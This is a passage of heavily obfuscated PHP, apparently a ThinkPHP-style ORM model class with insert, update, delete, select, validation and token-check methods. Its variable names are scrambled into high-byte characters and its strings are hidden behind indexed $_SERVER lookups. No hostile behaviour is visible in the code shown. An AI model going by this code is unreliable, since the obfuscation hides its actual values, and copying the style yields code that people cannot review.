$˜¬¿°«) { } protected function _after_insert($î×÷›í, $³¨ôéÏç) { } public function addAll($ÎİğŞä‚, $ıèö€Êò = array(), $¸á İ = false) { $›šÒËüı =& $_SERVER[®»±”ó²]; if (empty($ÎİğŞä‚)) { $this->error = think_lang($›šÒËüı[351]); return !1; } $ıèö€Êò = $this->_parseOptions($ıèö€Êò); foreach ($ÎİğŞä‚ as $ÜïñíêÜ => $û¡ñ½¼ƒ) { $ÎİğŞä‚[$ÜïñíêÜ] = $this->_facade($û¡ñ½¼ƒ); } if (method_exists($this->db, $›šÒËüı[352])) { $²²óÏ–Ô = $this->db->insertAll($ÎİğŞä‚, $ıèö€Êò, $¸á İ); } else { $this->startTrans(); foreach ($ÎİğŞä‚ as $ÜïñíêÜ => $û¡ñ½¼ƒ) { $²²óÏ–Ô = $this->db->insert($û¡ñ½¼ƒ, $ıèö€Êò, $¸á İ); } $this->commit(); } if (!1 !== $²²óÏ–Ô) { $Ÿ¦±ÓÁ³ = $this->getLastInsID(); if ($Ÿ¦±ÓÁ³) { return $Ÿ¦±ÓÁ³; } } return $²²óÏ–Ô; } public function selectAdd($€ÄÚúúÆ = '', $ÒÒş© = '', $·Š¯æÈß = array()) { $Æğ”÷³š =& $_SERVER[®»±”ó²]; $·Š¯æÈß = $this->_parseOptions($·Š¯æÈß); if (!1 === ($ËîĞº« = $this->db->selectInsert($€ÄÚúúÆ ? $€ÄÚúúÆ : $·Š¯æÈß[$Æğ”÷³š[353]], $ÒÒş© ? $ÒÒş© : $this->getTableName(), $·Š¯æÈß))) { $this->error = think_lang($Æğ”÷³š[354]); return !1; } else { return $ËîĞº«; } } public function save($˜ö•úõ = '', $ÛÉµ·§ = array()) { $çÊ‹ÎôÛ =& $_SERVER[®»±”ó²]; if (empty($˜ö•úõ)) { if (!empty($this->data)) { $˜ö•úõ = $this->data; $this->data = array(); } else { $this->error = think_lang($çÊ‹ÎôÛ[351]); return !1; } } $˜ö•úõ = $this->_facade($˜ö•úõ); $ÛÉµ·§ = $this->_parseOptions($ÛÉµ·§); $ı¦×öü = $this->getPk(); if (!isset($ÛÉµ·§[$çÊ‹ÎôÛ[355]])) { if (isset($˜ö•úõ[$ı¦×öü])) { $¾‡Ää©‚[$ı¦×öü] = $˜ö•úõ[$ı¦×öü]; $ÛÉµ·§[$çÊ‹ÎôÛ[355]] = $¾‡Ää©‚; unset($˜ö•úõ[$ı¦×öü]); } else { $this->error = think_lang($çÊ‹ÎôÛ[354]); return !1; } } if (is_array($ÛÉµ·§[$çÊ‹ÎôÛ[355]]) && isset($ÛÉµ·§[$çÊ‹ÎôÛ[355]][$ı¦×öü])) { $¶æÈˆëÌ = $ÛÉµ·§[$çÊ‹ÎôÛ[355]][$ı¦×öü]; } if (!1 === $this->_beforeUpdate($˜ö•úõ, $ÛÉµ·§)) { return !1; } $ü¨¼“Ï® = $this->db->update($˜ö•úõ, $ÛÉµ·§); if (!1 !== $ü¨¼“Ï®) { if (isset($¶æÈˆëÌ)) { $˜ö•úõ[$ı¦×öü] = $¶æÈˆëÌ; } $this->_afterUpdate($˜ö•úõ, $ÛÉµ·§); } return $ü¨¼“Ï®; } protected function _beforeUpdate(&$—¡Û ÷¶, $‰‚áàİ) { } protected function _afterUpdate($é’¡ãĞ, $¹àŞèÍ) { } public function delete($ù¢ƒ»´Î = array()) { $¸Ù©ÁÁ› =& $_SERVER[®»±”ó²]; if (empty($ù¢ƒ»´Î) && empty($this->options[$¸Ù©ÁÁ›[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ ëéã«¯ = $this->getPk(); if (is_numeric($ù¢ƒ»´Î) || is_string($ù¢ƒ»´Î)) { if (strpos($ù¢ƒ»´Î, $¸Ù©ÁÁ›[50])) { $€ÑÉû×±[$ ëéã«¯] = array($¸Ù©ÁÁ›[356], $ù¢ƒ»´Î); } else { $€ÑÉû×±[$ ëéã«¯] = $ù¢ƒ»´Î; } $this->options[$¸Ù©ÁÁ›[355]] = $€ÑÉû×±; } $ù¢ƒ»´Î = $this->_parseOptions(); if (is_array($ù¢ƒ»´Î[$¸Ù©ÁÁ›[355]]) && isset($ù¢ƒ»´Î[$¸Ù©ÁÁ›[355]][$ ëéã«¯])) { $Û‡‡ãÔç = $ù¢ƒ»´Î[$¸Ù©ÁÁ›[355]][$ ëéã«¯]; } $İùÒ¢ò = $this->db->delete($ù¢ƒ»´Î); if (!1 !== $İùÒ¢ò) { $«àìÍö = array(); if (isset($Û‡‡ãÔç)) { $«àìÍö[$ ëéã«¯] = $Û‡‡ãÔç; } $this->_after_delete($«àìÍö, $ù¢ƒ»´Î); } return $İùÒ¢ò; } protected function _after_delete($®ğôªï, $‚«îàë) { } public function select($Š±ñû‡† = array()) { $¯ãïÙ‹” =& $_SERVER[®»±”ó²]; if (is_string($Š±ñû‡†) || is_numeric($Š±ñû‡†)) { $ÙÃÜÈº  = $this->getPk(); if (strpos($Š±ñû‡†, $¯ãïÙ‹”[50])) { $ªÙ˜ñƒŞ[$ÙÃÜÈº ] = array($¯ãïÙ‹”[356], $Š±ñû‡†); } else { $ªÙ˜ñƒŞ[$ÙÃÜÈº ] = $Š±ñû‡†; } $this->options[$¯ãïÙ‹”[355]] = $ªÙ˜ñƒŞ; } elseif (!1 === $Š±ñû‡†) { $Š±ñû‡† = $this->_parseOptions(); return $¯ãïÙ‹”[357] . $this->db->buildSelectSql($Š±ñû‡†) . $¯ãïÙ‹”[358]; } $Š±ñû‡† = $this->_parseOptions(); $ÙÌéª‹ = $this->db->select($Š±ñû‡†); if (!1 === $ÙÌéª‹) { return !1; } if (empty($ÙÌéª‹)) { return null; } $this->_afterSelect($ÙÌéª‹, $Š±ñû‡†); return $ÙÌéª‹; } protected function _afterSelect(&$şôä§ş, $¡¦³ğ¨×) { } public function buildSql($ğ°ı›úó = array()) { $‘È¦øäâ =& $_SERVER[®»±”ó²]; $ğ°ı›úó = $this->_parseOptions($ğ°ı›úó); return $‘È¦øäâ[357] . $this->db->buildSelectSql($ğ°ı›úó) . $‘È¦øäâ[358]; } public function optionsValue($çØç¢ÎÛ = null) { if (is_null($çØç¢ÎÛ)) { return $this->options; } elseif (is_array($çØç¢ÎÛ)) { $this->options = array_merge($this->options, $çØç¢ÎÛ); } } protected function _parseOptions($ÈÚ¹É° = array()) { $µ”ñ”Š‰ =& $_SERVER[®»±”ó²]; if (is_array($ÈÚ¹É°)) { $ÈÚ¹É° = array_merge($this->options, $ÈÚ¹É°); } $this->options = array(); if (!isset($ÈÚ¹É°[$µ”ñ”Š‰[359]])) { $ÈÚ¹É°[$µ”ñ”Š‰[359]] = $this->getTableName(); $âŞÛ¢ù¸ = $this->fields; } else { $âŞÛ¢ù¸ = $this->getDbFields(); } if (!empty($ÈÚ¹É°[$µ”ñ”Š‰[360]])) { $ÈÚ¹É°[$µ”ñ”Š‰[359]] .= $µ”ñ”Š‰[53] . $ÈÚ¹É°[$µ”ñ”Š‰[360]]; } $ÈÚ¹É°[$µ”ñ”Š‰[361]] = $this->name; if (isset($ÈÚ¹É°[$µ”ñ”Š‰[355]]) && is_array($ÈÚ¹É°[$µ”ñ”Š‰[355]]) && !empty($âŞÛ¢ù¸) && !isset($ÈÚ¹É°[$µ”ñ”Š‰[362]]) && !isset($ÈÚ¹É°[$µ”ñ”Š‰[359]])) { foreach ($ÈÚ¹É°[$µ”ñ”Š‰[355]] as $ÏªëÌÁ => $Ú×öÆİŠ) { $ÏªëÌÁ = trim($ÏªëÌÁ); if (in_array($ÏªëÌÁ, $âŞÛ¢ù¸, !0)) { if (is_scalar($Ú×öÆİŠ)) { $this->_parseType($ÈÚ¹É°[$µ”ñ”Š‰[355]], $ÏªëÌÁ); } } elseif (!is_numeric($ÏªëÌÁ) && $µ”ñ”Š‰[11] != substr($ÏªëÌÁ, 0, 1) && !1 === strpos($ÏªëÌÁ, $µ”ñ”Š‰[10]) && !1 === strpos($ÏªëÌÁ, $µ”ñ”Š‰[340]) && !1 === strpos($ÏªëÌÁ, $µ”ñ”Š‰[215]) && !1 === strpos($ÏªëÌÁ, $µ”ñ”Š‰[287])) { unset($ÈÚ¹É°[$µ”ñ”Š‰[355]][$ÏªëÌÁ]); } } } $this->_options_filter($ÈÚ¹É°); return $ÈÚ¹É°; } protected function _options_filter(&$’Ö¦şúú) { } protected function _parseType(&$ïÚ…¥ŸÍ, $Õ”á€¯·) { $óº€íá =& $_SERVER[®»±”ó²]; if (empty($this->options[$óº€íá[363]][$óº€íá[4] . $Õ”á€¯·])) { $·ÀšÏ = strtolower($this->fields[$óº€íá[332]][$Õ”á€¯·]); if (!1 !== strpos($·ÀšÏ, $óº€íá[364])) { } elseif (!1 === strpos($·ÀšÏ, $óº€íá[365]) && !1 !== strpos($·ÀšÏ, $óº€íá[366])) { $ïÚ…¥ŸÍ[$Õ”á€¯·] = intval($ïÚ…¥ŸÍ[$Õ”á€¯·]); } elseif (!1 !== strpos($·ÀšÏ, $óº€íá[367]) || !1 !== strpos($·ÀšÏ, $óº€íá[368])) { $ïÚ…¥ŸÍ[$Õ”á€¯·] = floatval($ïÚ…¥ŸÍ[$Õ”á€¯·]); } elseif (!1 !== strpos($·ÀšÏ, $óº€íá[369])) { $ïÚ…¥ŸÍ[$Õ”á€¯·] = (bool) $ïÚ…¥ŸÍ[$Õ”á€¯·]; } } } public function find($Ğ¹ğº›é = array()) { $ä®ÍıóÁ =& $_SERVER[®»±”ó²]; if (is_numeric($Ğ¹ğº›é) || is_string($Ğ¹ğº›é)) { $ãÉÀ‘Ñê[$this->getPk()] = intval($Ğ¹ğº›é); $this->options[$ä®ÍıóÁ[355]] = $ãÉÀ‘Ñê; } $this->options[$ä®ÍıóÁ[370]] = 1; $Ğ¹ğº›é = $this->_parseOptions(); $ŸÍÆ£óÇ = $this->db->select($Ğ¹ğº›é); if (!1 === $ŸÍÆ£óÇ) { return !1; } if (empty($ŸÍÆ£óÇ)) { return null; } $ğÜï¹ ª = $ŸÍÆ£óÇ[0]; $this->_afterFind($ğÜï¹ ª, $Ğ¹ğº›é); return $ğÜï¹ ª; } protected function _afterFind(&$âÙ‡ö±œ, $İ®èò„ã) { } protected function returnResult($ÜğäßÑû, $¹Åæ½·Ğ = '') { $Ş÷Ô†ï… =& $_SERVER[®»±”ó²]; if ($¹Åæ½·Ğ) { if (is_callable($¹Åæ½·Ğ)) { return call_user_func($¹Åæ½·Ğ, $ÜğäßÑû); } switch (strtolower($¹Åæ½·Ğ)) { case $Ş÷Ô†ï…[371]: return json_encode($ÜğäßÑû); case $Ş÷Ô†ï…[372]: return xml_encode($ÜğäßÑû); } } return $ÜğäßÑû; } public function parseFieldsMap($Îš±İîÈ, $˜‡ÃœĞÚ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $íÌ”Ë»® => $â„èÂş÷) { if ($˜‡ÃœĞÚ == 1) { if (isset($Îš±İîÈ[$â„èÂş÷])) { $Îš±İîÈ[$íÌ”Ë»®] = $Îš±İîÈ[$â„èÂş÷]; unset($Îš±İîÈ[$â„èÂş÷]); } } else { if (isset($Îš±İîÈ[$íÌ”Ë»®])) { $Îš±İîÈ[$â„èÂş÷] = $Îš±İîÈ[$íÌ”Ë»®]; unset($Îš±İîÈ[$íÌ”Ë»®]); } } } } return $Îš±İîÈ; } public function setField($Ò§ëĞ£, $æ¹¡Ò¾ = '') { if (is_array($Ò§ëĞ£)) { $á÷©ÅÆö = $Ò§ëĞ£; } else { $á÷©ÅÆö[$Ò§ëĞ£] = $æ¹¡Ò¾; } return $this->save($á÷©ÅÆö); } public function setAdd($ø™™èà¬, $¿åªàÁÒ = 1) { $¨í•…É =& $_SERVER[®»±”ó²]; $âåÑ¶” = $ø™™èà¬ . $¨í•…É[373] . $¿åªàÁÒ; if ($¿åªàÁÒ < 0) { $âåÑ¶” = $ø™™èà¬ . $¿åªàÁÒ; } return $this->setField($ø™™èà¬, array($¨í•…É[374], $âåÑ¶”)); } public function getField($éÇ°¬ìï, $Ï×ƒÜ«š = null) { $í³Í§ü” =& $_SERVER[®»±”ó²]; $şäºğµŞ[$í³Í§ü”[353]] = $éÇ°¬ìï; $şäºğµŞ = $this->_parseOptions($şäºğµŞ); $éÇ°¬ìï = trim($éÇ°¬ìï); if (strpos($éÇ°¬ìï, $í³Í§ü”[50])) { if (!isset($şäºğµŞ[$í³Í§ü”[370]])) { $şäºğµŞ[$í³Í§ü”[370]] = is_numeric($Ï×ƒÜ«š) ? $Ï×ƒÜ«š : $í³Í§ü”[12]; } $ØÚ¬”Ôô = $this->db->select($şäºğµŞ); if (!empty($ØÚ¬”Ôô)) { $á³€³ò³ = explode($í³Í§ü”[50], $éÇ°¬ìï); $éÇ°¬ìï = array_keys($ØÚ¬”Ôô[0]); $‰áÛ¸õ¥ = array_shift($éÇ°¬ìï); $ô¸¨ÔÂß = array_shift($éÇ°¬ìï); $õ¡ÜĞ = array(); $Ï‚ÓŞ“ã = count($á³€³ò³); foreach ($ØÚ¬”Ôô as $‘ºÔˆÕ) { $êéÉÜÀÓ = $‘ºÔˆÕ[$‰áÛ¸õ¥]; if (2 == $Ï‚ÓŞ“ã) { $õ¡ÜĞ[$êéÉÜÀÓ] = $‘ºÔˆÕ[$ô¸¨ÔÂß]; } else { $õ¡ÜĞ[$êéÉÜÀÓ] = is_string($Ï×ƒÜ«š) ? implode($Ï×ƒÜ«š, $‘ºÔˆÕ) : $‘ºÔˆÕ; } } return $õ¡ÜĞ; } } else { if (!0 !== $Ï×ƒÜ«š) { $şäºğµŞ[$í³Í§ü”[370]] = is_numeric($Ï×ƒÜ«š) ? $Ï×ƒÜ«š : 1; } if ($Ï×ƒÜ«š === $í³Í§ü”[335]) { unset($şäºğµŞ[$í³Í§ü”[370]]); } $‘ºÔˆÕ = $this->db->select($şäºğµŞ); if (!empty($‘ºÔˆÕ)) { if ($Ï×ƒÜ«š === $í³Í§ü”[335]) { return reset($‘ºÔˆÕ[0]); } if (!0 !== $Ï×ƒÜ«š && 1 == $şäºğµŞ[$í³Í§ü”[370]]) { return reset($‘ºÔˆÕ[0]); } foreach ($‘ºÔˆÕ as $¢æ”ü¾ñ) { $à‰˜àÑò[] = $¢æ”ü¾ñ[$éÇ°¬ìï]; } return $à‰˜àÑò; } } return null; } public function create($ë•–¿œ• = '', $ªîî±¸‰ = '') { $‹ãĞÙŞµ =& $_SERVER[®»±”ó²]; if (empty($ë•–¿œ•)) { $ë•–¿œ• = $_POST; } elseif (is_object($ë•–¿œ•)) { $ë•–¿œ• = get_object_vars($ë•–¿œ•); } if (empty($ë•–¿œ•) || !is_array($ë•–¿œ•)) { $this->error = think_lang($‹ãĞÙŞµ[351]); return !1; } $ë•–¿œ• = $this->parseFieldsMap($ë•–¿œ•, 0); $ªîî±¸‰ = $ªîî±¸‰ ? $ªîî±¸‰ : (!empty($ë•–¿œ•[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‹ãĞÙŞµ[353]])) { $½ößµêÇ = $this->options[$‹ãĞÙŞµ[353]]; unset($this->options[$‹ãĞÙŞµ[353]]); } elseif ($ªîî±¸‰ == THINK_MODEL_INSERT && isset($this->insertFields)) { $½ößµêÇ = $this->insertFields; } elseif ($ªîî±¸‰ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $½ößµêÇ = $this->updateFields; } if (isset($½ößµêÇ)) { if (is_string($½ößµêÇ)) { $½ößµêÇ = explode($‹ãĞÙŞµ[50], $½ößµêÇ); } if (think_config($‹ãĞÙŞµ[375])) { $½ößµêÇ[] = think_config($‹ãĞÙŞµ[376]); } foreach ($ë•–¿œ• as $ú¬Ğ¹Û => $ÚÍ´²¼°) { if (!in_array($ú¬Ğ¹Û, $½ößµêÇ)) { unset($ë•–¿œ•[$ú¬Ğ¹Û]); } } } if (!$this->autoValidation($ë•–¿œ•, $ªîî±¸‰)) { return !1; } if (!$this->autoCheckToken($ë•–¿œ•)) { $this->error = think_lang($‹ãĞÙŞµ[377]); return !1; } if ($this->autoCheckFields) { $½ößµêÇ = $this->getDbFields(); foreach ($ë•–¿œ• as $ú¬Ğ¹Û => $ÚÍ´²¼°) { if (!in_array($ú¬Ğ¹Û, $½ößµêÇ)) { unset($ë•–¿œ•[$ú¬Ğ¹Û]); } elseif (MAGIC_QUOTES_GPC && is_string($ÚÍ´²¼°)) { $ë•–¿œ•[$ú¬Ğ¹Û] = stripslashes($ÚÍ´²¼°); } } } $this->autoOperation($ë•–¿œ•, $ªîî±¸‰); $this->data = $ë•–¿œ•; return $ë•–¿œ•; } public function autoCheckToken($îŞËĞ‘) { $ÑØÎøœÅ =& $_SERVER[®»±”ó²]; if (isset($this->options[$ÑØÎøœÅ[378]]) && !$this->options[$ÑØÎøœÅ[378]]) { return !0; } if (think_config($ÑØÎøœÅ[375])) { $µ™Ó«¼© = think_config($ÑØÎøœÅ[376]); if (!isset($îŞËĞ‘[$µ™Ó«¼©]) || Session::get($µ™Ó«¼©)) { return !1; } list($˜ßØ‰é¦, $ù×öšƒÆ) = explode($ÑØÎøœÅ[11], $îŞËĞ‘[$µ™Ó«¼©]); if ($ù×öšƒÆ && Session::get($µ™Ó«¼© . $ÑØÎøœÅ[10] . $˜ßØ‰é¦) === $ù×öšƒÆ) { Session::remove($µ™Ó«¼© . $ÑØÎøœÅ[10] . $˜ßØ‰é¦); return !0; } if (think_config($ÑØÎøœÅ[379])) { Session::remove($µ™Ó«¼© . $ÑØÎøœÅ[10] . $˜ßØ‰é¦); } return !1; } return !0; } public function regex($†Îï¹òí, $üøœãµ) { $Ü°Ğ¼¹ =& $_SERVER[®»±”ó²]; $ÍÌÁòÔ  = array($Ü°Ğ¼¹[380] => $Ü°Ğ¼¹[381], $Ü°Ğ¼¹[382] => $Ü°Ğ¼¹[383], $Ü°Ğ¼¹[384] => $Ü°Ğ¼¹[385], $Ü°Ğ¼¹[386] => $Ü°Ğ¼¹[387], $Ü°Ğ¼¹[388] => $Ü°Ğ¼¹[389], $Ü°Ğ¼¹[390] => $Ü°Ğ¼¹[391], $Ü°Ğ¼¹[392] => $Ü°Ğ¼¹[393], $Ü°Ğ¼¹[368] => $Ü°Ğ¼¹[394], $Ü°Ğ¼¹[395] => $Ü°Ğ¼¹[396]); if (isset($ÍÌÁòÔ [strtolower($üøœãµ)])) { $üøœãµ = $ÍÌÁòÔ [strtolower($üøœãµ)]; } return preg_match($üøœãµ, $†Îï¹òí) === 1; } private function autoOperation(&$à¼Î¤…š, $Öú¥Ä¨ó) { $Á‚¡Å™Æ =& $_SERVER[®»±”ó²]; if (!empty($this->options[$Á‚¡Å™Æ[397]])) { $ƒÄµº´µ = $this->options[$Á‚¡Å™Æ[397]]; unset($this->options[$Á‚¡Å™Æ[397]]); } elseif (!empty($this->_auto)) { $ƒÄµº´µ = $this->_auto; } if (isset($ƒÄµº´µ)) { foreach ($ƒÄµº´µ as $«šÂçÓÚ) { if (empty($«šÂçÓÚ[2])) { $«šÂçÓÚ[2] = THINK_MODEL_INSERT; } if ($Öú¥Ä¨ó == $«šÂçÓÚ[2] || $«šÂçÓÚ[2] == THINK_MODEL_BOTH) { switch (trim($«šÂçÓÚ[3])) { case $Á‚¡Å™Æ[398]: case $Á‚¡Å™Æ[399]: $ŒÀÊñ ‡ = isset($«šÂçÓÚ[4]) ? (array) $«šÂçÓÚ[4] : array(); if (isset($à¼Î¤…š[$«šÂçÓÚ[0]])) { array_unshift($ŒÀÊñ ‡, $à¼Î¤…š[$«šÂçÓÚ[0]]); } if ($Á‚¡Å™Æ[398] == $«šÂçÓÚ[3]) { $à¼Î¤…š[$«šÂçÓÚ[0]] = call_user_func_array($«šÂçÓÚ[1], $ŒÀÊñ ‡); } else { $à¼Î¤…š[$«šÂçÓÚ[0]] = call_user_func_array(array(&$this, $«šÂçÓÚ[1]), $ŒÀÊñ ‡); } break; case $Á‚¡Å™Æ[353]: $à¼Î¤…š[$«šÂçÓÚ[0]] = $à¼Î¤…š[$«šÂçÓÚ[1]]; break; case $Á‚¡Å™Æ[400]: if ($Á‚¡Å™Æ[12] === $à¼Î¤…š[$«šÂçÓÚ[0]]) { unset($à¼Î¤…š[$«šÂçÓÚ[0]]); } break; case $Á‚¡Å™Æ[401]: default: $à¼Î¤…š[$«šÂçÓÚ[0]] = $«šÂçÓÚ[1]; } if (!1 === $à¼Î¤…š[$«šÂçÓÚ[0]]) { unset($à¼Î¤…š[$«šÂçÓÚ[0]]); } } } } return $à¼Î¤…š; } protected function autoValidation($ª¿ÔŸû, $ÍÜÃãµœ) { $¹–ì«ü =& $_SERVER[®»±”ó²]; if (!empty($this->options[$¹–ì«ü[402]])) { $‘ı½çŒì = $this->options[$¹–ì«ü[402]]; unset($this->options[$¹–ì«ü[402]]); } elseif (!empty($this->_validate)) { $‘ı½çŒì = $this->_validate; } if (isset($‘ı½çŒì)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‘ı½çŒì as $ş½¸³¹« => $Œ¬ç³™ª) { if (empty($Œ¬ç³™ª[5]) || $Œ¬ç³™ª[5] == THINK_MODEL_BOTH || $Œ¬ç³™ª[5] == $ÍÜÃãµœ) { if (0 == strpos($Œ¬ç³™ª[2], $¹–ì«ü[403]) && strpos($Œ¬ç³™ª[2], $¹–ì«ü[404])) { $Œ¬ç³™ª[2] = think_lang(substr($Œ¬ç³™ª[2], 2, -1)); } $Œ¬ç³™ª[3] = isset($Œ¬ç³™ª[3]) ? $Œ¬ç³™ª[3] : THINK_EXISTS_VALIDATE; $Œ¬ç³™ª[4] = isset($Œ¬ç³™ª[4]) ? $Œ¬ç³™ª[4] : $¹–ì«ü[405]; switch ($Œ¬ç³™ª[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ª¿ÔŸû, $Œ¬ç³™ª)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¹–ì«ü[12] != trim($ª¿ÔŸû[$Œ¬ç³™ª[0]])) { if (!1 === $this->_validationField($ª¿ÔŸû, $Œ¬ç³™ª)) { return !1; } } break; default: if (isset($ª¿ÔŸû[$Œ¬ç³™ª[0]])) { if (!1 === $this->_validationField($ª¿ÔŸû, $Œ¬ç³™ª)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ç¼Ï•‡Ë, $ÇùğÙ™€) { if (!1 === $this->_validationFieldItem($Ç¼Ï•‡Ë, $ÇùğÙ™€)) { if ($this->patchValidate) { $this->error[$ÇùğÙ™€[0]] = $ÇùğÙ™€[2]; } else { $this->error = $ÇùğÙ™€[2]; return !1; } } return; } protected function _validationFieldItem($óå¾ŠçŒ, $õÃ­Û¶) { $÷³õïÅ¸ =& $_SERVER[®»±”ó²]; switch (strtolower(trim($õÃ­Û¶[4]))) { case $÷³õïÅ¸[398]: case $÷³õïÅ¸[399]: $ˆè¶Ûˆ = isset($õÃ­Û¶[6]) ? (array) $õÃ­Û¶[6] : array(); if (is_string($õÃ­Û¶[0]) && strpos($õÃ­Û¶[0], $÷³õïÅ¸[50])) { $õÃ­Û¶[0] = explode($÷³õïÅ¸[50], $õÃ­Û¶[0]); } if (is_array($õÃ­Û¶[0])) { foreach ($õÃ­Û¶[0] as $ŒøÃìè¤) { $†ÅŞœî[$ŒøÃìè¤] = $óå¾ŠçŒ[$ŒøÃìè¤]; } array_unshift($ˆè¶Ûˆ, $†ÅŞœî); } else { array_unshift($ˆè¶Ûˆ, $óå¾ŠçŒ[$õÃ­Û¶[0]]); } if ($÷³õïÅ¸[398] == $õÃ­Û¶[4]) { return call_user_func_array($õÃ­Û¶[1], $ˆè¶Ûˆ); } else { return call_user_func_array(array(&$this, $õÃ­Û¶[1]), $ˆè¶Ûˆ); } case $÷³õïÅ¸[406]: return $óå¾ŠçŒ[$õÃ­Û¶[0]] == $óå¾ŠçŒ[$õÃ­Û¶[1]]; case $÷³õïÅ¸[407]: if (is_string($õÃ­Û¶[0]) && strpos($õÃ­Û¶[0], $÷³õïÅ¸[50])) { $õÃ­Û¶[0] = explode($÷³õïÅ¸[50], $õÃ­Û¶[0]); } $Ñó¤üï¶ = array(); if (is_array($õÃ­Û¶[0])) { foreach ($õÃ­Û¶[0] as $ŒøÃìè¤) { $Ñó¤üï¶[$ŒøÃìè¤] = $óå¾ŠçŒ[$ŒøÃìè¤]; } } else { $Ñó¤üï¶[$õÃ­Û¶[0]] = $óå¾ŠçŒ[$õÃ­Û¶[0]]; } if (!empty($óå¾ŠçŒ[$this->getPk()])) { $Ñó¤üï¶[$this->getPk()] = array($÷³õïÅ¸[408], $óå¾ŠçŒ[$this->getPk()]); } if ($this->where($Ñó¤üï¶)->find()) { return !1; } return !0; default: return $this->check($óå¾ŠçŒ[$õÃ­Û¶[0]], $õÃ­Û¶[1], $õÃ­Û¶[4]); } } public function check($Òİ­‰öË, $‚âÙÌÀÆ, $ÂŞıÂ÷¯ = "\162\x65\x67\145\170") { $‡”»€› =& $_SERVER[®»±”ó²]; $ÂŞıÂ÷¯ = strtolower(trim($ÂŞıÂ÷¯)); switch ($ÂŞıÂ÷¯) { case $‡”»€›[7]: case $‡”»€›[409]: $´÷º†Üà = is_array($‚âÙÌÀÆ) ? $‚âÙÌÀÆ : explode($‡”»€›[50], $‚âÙÌÀÆ); return $ÂŞıÂ÷¯ == $‡”»€›[7] ? in_array($Òİ­‰öË, $´÷º†Üà) : !in_array($Òİ­‰öË, $´÷º†Üà); case $‡”»€›[410]: case $‡”»€›[411]: if (is_array($‚âÙÌÀÆ)) { $è»˜©¹ì = $‚âÙÌÀÆ[0]; $–¤ˆŸˆî = $‚âÙÌÀÆ[1]; } else { list($è»˜©¹ì, $–¤ˆŸˆî) = explode($‡”»€›[50], $‚âÙÌÀÆ); } return $ÂŞıÂ÷¯ == $‡”»€›[410] ? $Òİ­‰öË >= $è»˜©¹ì && $Òİ­‰öË <= $–¤ˆŸˆî : $Òİ­‰öË < $è»˜©¹ì || $Òİ­‰öË > $–¤ˆŸˆî; case $‡”»€›[412]: case $‡”»€›[413]: return $ÂŞıÂ÷¯ == $‡”»€›[412] ? $Òİ­‰öË == $‚âÙÌÀÆ : $Òİ­‰öË != $‚âÙÌÀÆ; case $‡”»€›[414]: $Ã’„µ¹ = mb_strlen($Òİ­‰öË, $‡”»€›[415]); if (strpos($‚âÙÌÀÆ, $‡”»€›[50])) { list($è»˜©¹ì, $–¤ˆŸˆî) = explode($‡”»€›[50], $‚âÙÌÀÆ); return $Ã’„µ¹ >= $è»˜©¹ì && $Ã’„µ¹ <= $–¤ˆŸˆî; } else { return $Ã’„µ¹ == $‚âÙÌÀÆ; } case $‡”»€›[416]: list($Œƒˆúë°, $’©¼£Ô·) = explode($‡”»€›[50], $‚âÙÌÀÆ); if (!is_numeric($Œƒˆúë°)) { $Œƒˆúë° = strtotime($Œƒˆúë°); } if (!is_numeric($’©¼£Ô·)) { $’©¼£Ô· = strtotime($’©¼£Ô·); } return NOW_TIME >= $Œƒˆúë° && NOW_TIME <= $’©¼£Ô·; case $‡”»€›[417]: return in_array(get_client_ip(), explode($‡”»€›[50], $‚âÙÌÀÆ)); case $‡”»€›[418]: return !in_array(get_client_ip(), explode($‡”»€›[50], $‚âÙÌÀÆ)); case $‡”»€›[405]: default: return $this->regex($Òİ­‰öË, $‚âÙÌÀÆ); } } public function query($´†Õù­í, $†ë‡È¸¸ = false) { $×»’İÆÓ =& $_SERVER[®»±”ó²]; if (!is_bool($†ë‡È¸¸) && !is_array($†ë‡È¸¸)) { $†ë‡È¸¸ = func_get_args(); array_shift($†ë‡È¸¸); } $´†Õù­í = str_replace(array($×»’İÆÓ[288], $×»’İÆÓ[419]), $×»’İÆÓ[53], $´†Õù­í); $´†Õù­í = $this->parseSql($´†Õù­í, $†ë‡È¸¸); return $this->db->query($´†Õù­í); } public function execute($âÉúÄœï, $‡“š¼§ = false) { if (!is_bool($‡“š¼§) && !is_array($‡“š¼§)) { $‡“š¼§ = func_get_args(); array_shift($‡“š¼§); } $âÉúÄœï = $this->parseSql($âÉúÄœï, $‡“š¼§); return $this->db->execute($âÉúÄœï); } protected function parseSql($§î•ÙË–, $İ‡ŞßÊä) { $…ĞÕ’¾û =& $_SERVER[®»±”ó²]; if (!0 === $İ‡ŞßÊä) { $öş¹•ë¯ = $this->_parseOptions(); $§î•ÙË– = $this->db->parseSql($§î•ÙË–, $öş¹•ë¯); } elseif (is_array($İ‡ŞßÊä)) { $İ‡ŞßÊä = array_map(array($this->db, $…ĞÕ’¾û[420]), $İ‡ŞßÊä); $§î•ÙË– = vsprintf($§î•ÙË–, $İ‡ŞßÊä); } else { $§î•ÙË– = strtr($§î•ÙË–, array($…ĞÕ’¾û[421] => $this->getTableName(), $…ĞÕ’¾û[422] => think_config($…ĞÕ’¾û[324]))); } $this->db->setModel($this->name); return $§î•ÙË–; } public function db($¬¶¶¨»Ç = '', $˜œ§ĞÂØ = '', $ğôõ·§İ = array()) { $ñÚ±¸•¸ =& $_SERVER[®»±”ó²]; if ($ñÚ±¸•¸[12] === $¬¶¶¨»Ç && $this->db) { return $this->db; } static $µü¬‰¤ì = array(); static $‘Ï©ÅÉ = array(); if (!isset($‘Ï©ÅÉ[$¬¶¶¨»Ç]) || isset($‘Ï©ÅÉ[$¬¶¶¨»Ç]) && $˜œ§ĞÂØ && $µü¬‰¤ì[$¬¶¶¨»Ç] != $˜œ§ĞÂØ) { if (!empty($˜œ§ĞÂØ) && is_string($˜œ§ĞÂØ) && !1 === strpos($˜œ§ĞÂØ, $ñÚ±¸•¸[8])) { $˜œ§ĞÂØ = think_config($˜œ§ĞÂØ); } $¬¶¶¨»Ç = think_guid($˜œ§ĞÂØ); 